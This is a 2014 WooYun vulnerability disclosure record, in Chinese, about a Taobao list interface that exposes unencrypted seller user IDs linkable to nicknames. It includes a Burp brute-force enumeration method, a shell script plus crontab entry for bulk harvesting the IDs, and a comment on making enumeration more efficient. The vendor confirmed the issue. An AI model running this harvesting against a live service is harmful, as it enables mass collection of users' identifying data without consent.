{"id": 48440, "wybug_id": "wooyun-2014-082990", "wybug_title": "淘宝某接口泄露用户敏感信息(可获取匿名卖家ID等信息,附批量统计脚本)", "wybug_corp": "淘宝网", "wybug_author": "看什麼看", "wybug_date": "2014-11-12 14:48", "wybug_open_date": "2014-12-27 14:50", "wybug_type": "重要敏感信息泄露", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄漏"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-27：\t细节向公众公开  简要描述： 通過這個接口能得到好多信息，包括未加密的用戶id。 详细说明：  http://list.taobao.com/itemlist/default.htm?json=on&atype=b&cat=50026909然後一搜，https://wen.lu/?#q=site:taobao.com+%22status%22:+%7B+%22code%22:+%22200%22+,+%22url%22:+%22%22+%7D發現這個是通用的接口。只要改後面的cat就可以了。分析一下，發現user_number_id就是user_id。未加密的。舉例子：比如返回的這條： \"storeLink\":\"http://store.taobao.com/shop/view_shop.htm?user_number_id=144161231&ssid=r11\",user_number_id是144161231根據 WooYun: 淘宝网泄露匿名评论买家ID等信息 ，http://jianghu.taobao.com/u/MTQ0MTYxMjMx/front.htm自動跳轉到http://my.taobao.com/UvFQ0vFxYvCvY， 後面的是加密的id\n\nhttp://rate.taobao.com/user-rate-UvFQ0vFxYvCvY.htm, 得到用戶昵稱。\n\n攻擊方法：1.直接burp暴力枚舉，加上時延。2.寫個腳本過濾，去重。取名grep.sh\nls -l /tmp/burp*.tmp/ > ~/Develop/taobao_userid/src/taobao_userid/catfor file in /tmp/burp*.tmp/*do    echo ${file} >> ~/Develop/taobao_userid/src/taobao_userid/aaa    cat ${file} | grep \"user_number_id=\" | awk '{split($0,a,\"=\");print a[2]}' | awk '{split($0,a,\"&\");print a[1]}' >> \"~/Develop/taobao_userid/src/taobao_userid/ccc\"    rm ${file}donesort ~/Develop/taobao_userid/src/taobao_userid/ccc | uniq > ~/Develop/taobao_userid/src/taobao_userid/ccc.uniqcp ~/Develop/taobao_userid/src/taobao_userid/ccc{.uniq,}\n3.crontab -e@hourly ~/Develop/taobao_userid/src/taobao_userid/grep.sh   漏洞证明：  \n\nmask 区域\n*****354**********721**********249**********410**********680**********715**********754**********612**********548**********884**********599**********148**********404**********845**********901**********112**********691**********374**********323**********764**********118**********939**********267*****\n\n---一個晚上10w條的樣子。   修复方案：     版权声明：转载请注明来源 看什麼看@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2014-11-13 09:31 厂商回复： 感谢你对我们的支持与关注，该问题我们正在修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-16 02:05 |    \t\t看什麼看 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:4        | 知有飄零，畢竟飄零，便是飄零也感卿)\t\t \n  http://list.taobao.com/browse/cat-0.htm用這個分類,過濾得到catid，暴力更加高效。http://list.taobao.com/itemlist/default.htm?json=on&atype=b&cat=50026909本來就帶nickname    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}